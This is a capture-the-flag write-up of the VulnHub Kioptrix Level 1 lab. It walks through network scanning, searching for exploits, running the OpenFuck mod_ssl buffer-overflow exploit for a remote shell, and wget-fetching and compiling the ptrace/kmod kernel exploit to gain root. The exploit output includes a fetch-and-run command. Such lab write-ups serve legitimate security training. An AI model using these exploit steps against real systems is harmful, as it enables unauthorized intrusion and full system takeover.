
# VulnHub Write-Up - Kioptrix-Level-#1

> **Machine Name:** Kioptrix-Level-#1
>
> **Machine URL:** [https://www.vulnhub.com/entry/kioptrix-level-1-1,22]
>
> **Difficulty:** Easy
>
> **OS:** Linux
>
> **Date:** 19-Dec-2025
>
> **Author:** Ahmed Abd Elghany (0xAhmedITO)

---

> **Machine About**
>
> This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

## Super Note

It's important to have your own strategy of testing/playing, regardless of the machine's difficulty.

## Enumeration

### Netword Discovery

First i have to get the interface information.

```bash
┌──(kali㉿kali)-[~]
└─$ ip a 
...
...
...
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:86:b8:d3 brd ff:ff:ff:ff:ff:ff
    inet 192.168.11.100/24 brd 192.168.11.255 scope global noprefixroute eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::1f88:b0ca:b0cd:4230/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
```

My ip is 192.168.11.100, so i have to sweep the network on 192.168.11.0/24 to check all up hosts.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sn 192.168.11.0/24
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-19 12:16 -0500
Nmap scan report for 192.168.11.1
Host is up (0.00051s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.11.101
Host is up (0.00062s latency).
MAC Address: 00:0C:29:02:11:CD (VMware)
Nmap scan report for 192.168.11.100
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.88 seconds
```

**Findings:**
| IP             | Status | Notes            | Next Action |                                         |
| -------------- | ------ | ---------------- | ----------- | --------------------------------------- |
| 192.168.11.1   | Up     | Geteway |             | MAC Address: 00:50:56:C0:00:01 (VMware) |
| 192.168.11.101 | Up     | Potential Target |             | MAC Address: 00:0C:29:02:11:CD (VMware) |
| 192.168.11.100 | Up     | My machine       |             |                                         |

### Nmap Scan

Scanning top 1000 ports to define the possible attack vectors.

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ sudo nmap --top-ports 1000 -sS -sV -sC 192.168.11.101 -oN top_1000_ports_scan_192.168.11.101```

```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-19 12:21 -0500
Nmap scan report for 192.168.11.101
Host is up (0.0025s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods: 
|_  Potentially risky methods: TRACE
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1024/tcp   status
|_  100024  1           1026/udp   status
139/tcp  open  netbios-ssn Samba smbd (workgroup: uMYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2025-12-19T18:23:38+00:00; +1h01m53s from scanner time.
|_http-title: 400 Bad Request
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
1024/tcp open  status      1 (RPC #100024)
MAC Address: 00:0C:29:02:11:CD (VMware)

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: 1h01m52s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.85 seconds
```

**Findings:**

| Port | Service | Version | Notes | Banner | Other
|-----|-----|-----|-----|-----|-----
| 22/tcp | ssh | OpenSSH 2.9p2 | | | |
| 80/tcp | http | Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) |  |  |  |
| 139/tcp | netbios-ssn | Apache/1.3.20 (Unix) |  |  | (workgroup: uMYGROUP) |
| 443/tcp | ssl/https | Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b |  |  |  |
| 1024/tcp | (RPC #100024) |  |  |  |  |
|  |  |  |  |  |  |

---

Now i will searchsploit for each version we found.

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ searchsploit OpenSSH 2.9              
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                     | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                               | linux/remote/45210.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                 | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                       | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sock | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                     | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                         | linux/remote/45939.py
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ searchsploit apache 1.3.20      
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Execution              | php/remote/29290.c
Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scanner            | php/remote/29316.py
Apache 1.3.20 (Win32) - 'PHP.exe' Remote File Disclosure                     | windows/remote/21204.txt
Apache 1.3.6/1.3.9/1.3.11/1.3.12/1.3.20 - Root Directory Access              | windows/remote/19975.pl
Apache 1.3.x < 2.0.48 mod_userdir - Remote Users Disclosure                  | linux/remote/132.c
Apache < 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow                   | multiple/remote/2237.sh
Apache < 2.0.64 / < 2.2.21 mod_setenvif - Integer Overflow                   | linux/dos/41769.txt
Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak                             | linux/webapps/42745.py
Apache CouchDB < 2.1.0 - Remote Code Execution                               | linux/webapps/44913.py
Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service                          | multiple/dos/26710.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow         | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)   | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)   | unix/remote/47080.c
Apache Struts < 1.3.10 / < 2.3.16.2 - ClassLoader Manipulation Remote Code E | multiple/remote/41690.rb
Apache Struts < 2.2.0 - Remote Command Execution (Metasploit)                | multiple/remote/17691.rb
Apache Tika-server < 1.18 - Command Injection                                | windows/remote/46540.py
Apache Tomcat < 5.5.17 - Remote Directory Listing                            | multiple/remote/2061.txt
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal                          | unix/remote/14489.c
Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)                    | multiple/remote/6229.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload By | jsp/webapps/42966.py
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload By | windows/webapps/42953.txt
Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)                 | linux/dos/36906.txt
Oracle Java JDK/JRE < 1.8.0.131 / Apache Xerces 2.11.0 - 'PDF/Docx' Server S | php/dos/44057.md
Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Remote Code Execu | linux/remote/34.pl
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

**Findings:**

This exploit looks interesting, it matches :

**Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow**

There are 3 versions of the same exploit, i will choose the latest one.

Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)   | unix/remote/47080.c

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ searchsploit -x 47080
/*
 * OF version r00t VERY PRIV8 spabam
 * Version: v3.0.4
 * Requirements: libssl-dev    ( apt-get install libssl-dev )
 * Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto
 * objdump -R /usr/sbin/httpd|grep free to get more targets
 * #hackarena irc.brasnet.org
 * Note: if required, host ptrace and replace wget target
 */
```

After check the content, let's download and compile it.

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ searchsploit -m unix/remote/47080.c
  Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
      URL: https://www.exploit-db.com/exploits/47080
     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
    Codes: CVE-2002-0082, OSVDB-857
 Verified: False
File Type: C source, ASCII text
Copied to: /home/kali/Desktop/Labs_Notes/VulnHub/Kioptrix_L1/47080.c

┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ sudo apt-get install libssl-dev  
[sudo] password for kali: 
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
libssl-dev is already the newest version (3.5.4-1).
Solving dependencies... Done
The following packages were automatically installed and are no longer required:
  curlftpfs libavfilter10 libavformat61 libconfig-inifiles-perl libfuse2t64 libpocketsphinx3 libpostproc58
  libsphinxbase3t64 libswscale8 pocketsphinx-en-us
Use 'sudo apt autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 1 not upgraded.

┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ gcc -o exp_01 47080.c -lcrypto
...
...
...
```

Now trying the exploit:

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ ./exp_01    

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./exp_01 target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
        0x00 - Caldera OpenLinux (apache-1.3.26)
        0x01 - Cobalt Sun 6.0 (apache-1.3.12)
        0x02 - Cobalt Sun 6.0 (apache-1.3.20)
...
...
...
```

The USAGE here is like ./exp_01 target <box> <port> -c N, there are multible target types, let's find the one that matches our case:

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ ./exp_01| grep -i "Apache" | grep -i "red" | grep -i "1.3.20"
        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
```

Let's try both:

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ ./exp_01 0x6a 192.168.11.101 443 -c 40

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
Good Bye!

┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ ./exp_01 0x6b 192.168.11.101 443 -c 40

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--16:22:47--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... 
dl.packetstormsecurity.net: Host not found.                                                                    
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
bash: ./exploit: No such file or directory
bash-2.05$ 
bash-2.05$
```

Perfect! we got the server shell..

<img width="1479" height="876" alt="image" src="https://github.com/user-attachments/assets/56f606f2-b1d2-45d9-8527-c4168715588a" />

## Privilege Escalation

Checking the type of privelage we have

```bash
bash-2.05$ whoami
whoami
apache
bash-2.05$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
```

### Local Enumeration

The most common vuln on these type of old machines are related to kernel, let's check the kernel version and check if there any matching exploits.

```bash
bash-2.05$ uname -a
uname -a
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
bash-2.05$ cat /proc/version
cat /proc/version
Linux version 2.4.7-10 (bhcompile@stripples.devel.redhat.com) (gcc version 2.96 20000731 (Red Hat Linux 7.1 2.96-98)) #1 Thu Sep 6 16:46:36 EDT 2001
```

**Findings:**

Kernel Version: 2.4.7 (Red Hat Linux 7.1 2.96-98)

Now searchsploit for any matching exploits

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ searchsploit linux kernel 2.4.x Escalation --exclude="/dos/"
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation    | solaris/local/15962.c
Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation | linux/local/3.c
Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Escalation | linux/local/22362.c
Linux Kernel 2.2.x/2.4.x - Privileged Process Hijacking Privilege Escalation | linux/local/22363.c
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / U | linux/local/9545.c
Linux Kernel 2.4.x/2.6.x - 'Bluez' BlueTooth Signed Buffer Index Privilege E | linux/local/926.c
Linux Kernel 2.4.x/2.6.x - 'uselib()' Local Privilege Escalation (3)         | linux/local/895.c
Linux Kernel 2.4.x/2.6.x - BlueTooth Signed Buffer Index Privilege Escalatio | linux/local/25288.c
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Pr | linux_x86-64/local/33516.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                   | linux/local/41886.c
Linux Kernel < 2.4.20 - Module Loader Privilege Escalation                   | linux/local/12.c
Linux Kernel < 2.6.11.5 - BlueTooth Stack Privilege Escalation               | linux/local/4756.c
Linux Kernel < 2.6.19 (Debian 4) - 'udp_sendmsg' Local Privilege Escalation  | linux/local/9575.c
Linux Kernel < 2.6.19 (x86/x64) - 'udp_sendmsg' Local Privilege Escalation ( | linux/local/9574.txt
Linux Kernel < 2.6.22 - 'ftruncate()'/'open()' Local Privilege Escalation    | linux/local/6851.c
Linux Kernel < 2.6.28 - 'fasync_helper()' Local Privilege Escalation         | linux/local/33523.c
Linux Kernel < 2.6.29 - 'exit_notify()' Local Privilege Escalation           | linux/local/8369.sh
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Privilege E | linux_x86/local/15916.c
Linux Kernel < 2.6.34 (Ubuntu 10.10 x86/x64) - 'CAP_SYS_ADMIN' Local Privile | linux/local/15944.c
Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local Privileg | linux/local/14814.c
Linux Kernel < 2.6.36-rc4-git2 (x86-64) - 'ia32syscall' Emulation Privilege  | linux_x86-64/local/15023.c
Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privilege Es | linux/local/17787.c
Linux Kernel < 2.6.37-rc2 - 'ACPI custom_method' Local Privilege Escalation  | linux/local/15774.c
Linux Kernel < 2.6.7-rc3 (Slackware 9.1 / Debian 3.0) - 'sys_chown()' Group  | linux/local/718.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation            | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation | linux_x86-64/local/44302.c
Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege | linux_x86-64/local/34134.c
Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation    | arm/local/31574.c
Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local | linux_x86-64/local/44299.c
Linux Kernel < 3.8.9 (x86-64) - 'perf_swevent_init' Local Privilege Escalati | linux_x86-64/local/26131.c
Linux Kernel < 3.8.x - open-time Capability 'file_ns_capable()' Local Privil | linux/local/25450.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                 | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escal | linux/local/45553.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalatio | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation       | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege  | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin | linux/local/47169.c
----------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Many matched exploits found!, let's try the ptrace one.

Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation | linux/local/3.c

## Escalation

Check the exploit content then download it.

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ searchsploit -x linux/local/3.c
/*
 * Linux kernel ptrace/kmod local root exploit
 *
 * This code exploits a race condition in kernel/kmod.c, which creates
 * kernel thread in insecure manner. This bug allows to ptrace cloned
 * process, allowing to take control over privileged modprobe binary.
 *
 * Should work under all current 2.2.x and 2.4.x kernels.
 *
 * I discovered this stupid bug independently on January 25, 2003, that
 * is (almost) two month before it was fixed and published by Red Hat
 * and others.
 *
 * Wojciech Purczynski <cliph@isec.pl>
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY*
 * IT IS PROVIDED "AS IS" AND WITHOUT ANY WARRANTY
 *
 * (c) 2003 Copyright by iSEC Security Research
 */

┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ searchsploit -m linux/local/3.c
  Exploit: Linux Kernel 2.2.x/2.4.x (RedHat) - 'ptrace/kmod' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/3
     Path: /usr/share/exploitdb/exploits/linux/local/3.c
    Codes: OSVDB-4565, CVE-2003-0127
 Verified: True
File Type: C source, ASCII text
Copied to: /home/kali/Desktop/Labs_Notes/VulnHub/Kioptrix_L1/3.c
```

Next step is to transfer the file into machine, there are multible way, i will go with wget the file from my own local web server.

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ sudo systemctl enable apache2.service
Synchronizing state of apache2.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.
Executing: /usr/lib/systemd/systemd-sysv-install enable apache2

┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ sudo systemctl start apache2.service
```

Moving exploit file to /var/www/html/file/

```bash
┌──(kali㉿kali)-[~/Desktop/Labs_Notes/VulnHub/Kioptrix_L1]
└─$ sudo cp 3.c /var/www/html/file
```

Now download the file into machine.

```bash
bash-2.05$ cd /tmp
cd /tmp
bash-2.05$ wget http://192.168.11.100/file/3.c
wget http://192.168.11.100/file/3.c
--19:01:09--  http://192.168.11.100/file/3.c
           => `3.c'
Connecting to 192.168.11.100:80... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,754 [text/x-csrc]

    0K ...                                                   100% @   3.58 MB/s

19:01:09 (3.58 MB/s) - `3.c' saved [3754/3754]
```

Final step, compiling the file, then run it.
```bash
bash-2.05$ gcc -o priv_esc_01 3.c
gcc -o priv_esc_01 3.c
3.c:185:27: warning: no newline at end of file
bash-2.05$
bash-2.05$ 
bash-2.05$ ./priv_esc_01
./priv_esc_01
[+] Attached to 2345
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
whoami
root
```

We are **root**!

<img width="1477" height="498" alt="image" src="https://github.com/user-attachments/assets/e36d540f-7be0-4e74-b365-41ce7b7d7079" />

---

## 🔗 References

* [https://www.exploit-db.com/exploits/47080]
* [https://www.exploit-db.com/exploits/3]

---
